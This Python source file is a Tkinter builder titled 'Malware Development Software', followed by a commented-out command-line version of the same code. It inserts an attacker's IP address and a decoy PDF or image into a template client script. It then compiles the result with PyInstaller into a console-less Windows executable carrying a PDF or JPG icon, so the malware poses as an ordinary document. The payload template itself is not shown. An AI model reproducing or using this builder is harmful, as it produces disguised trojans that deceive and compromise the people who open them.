import subprocess
import sys
import os
import os.path
import re
import socket

from tkinter import *
from tkinter import ttk
from tkinter import filedialog as fd
from tkinter.messagebox import showinfo

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

global selected_file
selected_file = ""

window = Tk()
window.title("Malware Development Software")
window.minsize(width=700, height=600)


def select_file():
	global selected_file
	filetypes = (
		[('All files', '*.*'),
        ('PDF files', '*.pdf'),
        ('Image files', '.jpg')]
        )

	filename = fd.askopenfilename(
		title='Open a file',
		initialdir=os.getcwd(),
		filetypes=filetypes)
	selected_file=filename
	file_to_embed = Label(text=selected_file)
	file_to_embed.place(x=150,y=350)

	showinfo(
        title='Selected File',
        message=filename,
    )




def getValue():
	ip = ip_entry.get()
	while True:
		if ip == "" or ip == " ":
			ip = IPAddr
		break
	malware_name = malware_name_entry.get()
	while True:
		if malware_name == " " or malware_name == "":
			showinfo("Name Please!!","[!]Please Enter malware name")
			return
		break
	cover_file = selected_file.split("/")[-1]
	while True:
		file_exists = os.path.exists(cover_file)
		if not file_exists:
			showinfo("[-]Error","[-]file not found!")
			return
		break
		

	if 'pdf' in cover_file:
		icon_type = "pdf_icon.ico"
	else:
		icon_type = "jpg_icon.ico"

	with open('client.py','r') as file:
		content = file.read()

	new_content = re.sub("<<<<..>>>>", ip,content)

	new_content = re.sub("<<<<FILE_NAME>>>>",cover_file,new_content)

	with open(f"{malware_name}.py",'w') as file:
		file.write(new_content)

	command = f"pyinstaller --add-data {cover_file};. --noconsole --onefile --icon {icon_type} {malware_name}.py"
	command = command.split()

	subprocess.check_output(command, shell=True)


	subprocess.check_output(["rm","-r","build"],shell=True)
	# os.remove(f"{malware_name}.py")
	os.remove(f"{malware_name}.spec")

	if not os.path.isdir("malwares"):
		os.mkdir("malwares")

	subprocess.check_output(["mv",f"dist\{malware_name}.exe",f"malwares\{malware_name}.exe"],shell=True)
	subprocess.check_output(["rm","-r","dist"],shell=True)

	sys.exit()


label = Label(text="Malware Development Software", font=('Helvetica',30,"bold"))
label.config(padx=70)
label.place(x=0,y=20)

ip_label = Label(text=f"Enter IP address ({IPAddr}) : ")
ip_label.place(x=110,y=150)

ip_entry = Entry(width=20,font=("Helvetica",13,"bold"))
ip_entry.place(x=280,y=150)

malware_name_label = Label(text="Enter malware name: ")
malware_name_label.place(x=132,y=200)

malware_name_entry = Entry(width=20, font=("Helvetica",13,"bold"))
malware_name_entry.place(x=280,y=200)

open_button_label = Label(text="File to Embed Malware : ")
open_button_label.place(x=150,y=300)

open_button = ttk.Button(
    window,
    text='Select a File',
    command=select_file
)
open_button.place(x=320,y=300)

submit_button = Button(window, command = getValue,text="Create Malware", width=35,bd=6,height=2,bg="white",fg="black",activebackground="black",activeforeground="white")
submit_button.place(x=230,y=390)

window.mainloop()

####

#####COMMAND LINE CODE:

# hostname = socket.gethostname()
# IPAddr = socket.gethostbyname(hostname)


# while True:
# 	ip = input(f"Enter the ip address to listen to({IPAddr}) >> ")
# 	if ip == "" or ip == " ":
# 		ip = IPAddr
# 	break
# print(f"\n[+]Ip address set to {ip}\n")

# while True:
# 	malware_name = input("Name of the malware >> ")
# 	if malware_name == " " or malware_name == "":
# 		continue
# 	break

# print(f"\n[+]malware_name set to {malware_name}\n")

# while True:
# 	cover_file = input("File to Embedd Malware >> ")
# 	file_exists = os.path.exists(cover_file)
# 	if file_exists:
# 		break
# 	print(f"[!] {cover_file} not found!")

# if 'pdf' in cover_file:
# 	icon_type = "pdf_icon.ico"
# else:
# 	icon_type = "jpg_icon.ico"

# with open('client.py','r') as file:
# 	content = file.read()

# new_content = re.sub("<<<<..>>>>", ip,content)

# new_content = re.sub("<<<<FILE_NAME>>>>",cover_file,new_content)

# with open(f"{malware_name}.py",'w') as file:
# 	file.write(new_content)

# command = f"pyinstaller --add-data {cover_file};. --noconsole --onefile --icon {icon_type} {malware_name}.py"
# command = command.split()

# subprocess.check_output(command, shell=True)


# subprocess.check_output(["rm","-r","build"],shell=True)
# os.remove(f"{malware_name}.py")
# os.remove(f"{malware_name}.spec")

# subprocess.check_output(["mv",f"dist\{malware_name}.exe",f"{malware_name}.exe"],shell=True)

# sys.exit()